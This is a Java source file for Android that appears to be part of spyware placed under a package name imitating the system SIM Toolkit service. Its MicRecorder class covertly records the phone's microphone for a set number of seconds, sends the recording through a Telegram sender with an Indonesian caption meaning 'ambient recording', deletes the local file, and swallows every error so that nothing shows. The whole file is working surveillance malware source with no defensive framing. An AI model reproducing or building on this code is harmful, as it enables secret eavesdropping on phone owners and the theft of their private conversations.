package com.android.stk.service;

import android.content.Context;
import android.media.MediaRecorder;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MicRecorder {

    private static MediaRecorder recorder;
    private static File outputFile;

    public static void recordAndSend(Context context, int durasiDetik) {
        new Thread(() -> {
            try {
                File cacheDir = context.getCacheDir();
                String fileName = "mic_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date()) + ".3gp";
                outputFile = new File(cacheDir, fileName);

                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(outputFile.getAbsolutePath());
                recorder.prepare();
                recorder.start();

                Thread.sleep(durasiDetik * 1000);

                recorder.stop();
                recorder.release();
                recorder = null;

                if (outputFile.exists()) {
                    TelegramSender.sendAudio(outputFile, "🎙️ Rekaman sekitar: " + fileName);
                    outputFile.delete(); // Hapus setelah dikirim
                }

            } catch (Exception ignored) {
                // Fail silent
            }
        }).start();
    }
}
